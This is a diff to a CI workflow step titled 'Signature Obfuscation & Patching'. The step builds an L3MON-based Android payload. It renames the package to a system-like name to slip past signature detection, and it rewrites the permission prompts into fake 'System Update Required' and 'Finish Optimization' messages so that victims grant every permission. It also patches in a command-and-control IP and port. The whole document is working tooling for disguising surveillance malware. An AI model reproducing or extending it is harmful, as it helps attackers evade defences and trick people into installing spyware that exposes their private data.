@@ -26,31 +26,33 @@ jobs:
 
       - name: Signature Obfuscation & Patching
         run: |
-          # 1. Change Package Name (The biggest red flag)
+          # 1. Change Package Name
+          # NOTE: We use dots for standard package names and slashes for L...; descriptors
           OLD_PKG="com.etechd.l3mon"
-          NEW_PKG="com.android.process.manager"
+          NEW_PKG="com.app.sys.manager"
           OLD_PATH="com/etechd/l3mon"
-          NEW_PATH="com/android/process/manager"
+          NEW_PATH="com/app/sys/manager"
 
           echo "Renaming package from $OLD_PKG to $NEW_PKG..."
           
-          # Replace strings in all files
+          # Replace Lcom/etechd/l3mon; style descriptors first
+          find payload_source -type f -exec sed -i "s|L$OLD_PATH;|L$NEW_PATH;|g" {} +
+          # Replace com.etechd.l3mon style strings
           find payload_source -type f -exec sed -i "s|$OLD_PKG|$NEW_PKG|g" {} +
+          # Replace com/etechd/l3mon style paths
           find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +
 
           # Rename directories
           mkdir -p "payload_source/smali/$NEW_PATH"
           mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
-          # Clean up old empty dirs if any
           rm -rf "payload_source/smali/com/etechd"
 
           # 2. Obfuscate Social Engineering Strings
-          # Instead of "Enable ALL permissions", we use something generic
           sed -i "s|Click 'Permissions'|System Update Required|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "s|Enable ALL permissions|Please grant necessary rights|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "s|Enable 'Package Manager'|Finish Optimization|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          # 3. Dynamic IP/Port Patching (Existing functionality)
+          # 3. Dynamic IP/Port Patching
           chmod +x patch_payload.sh
           # Update patch script to use new path
           sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
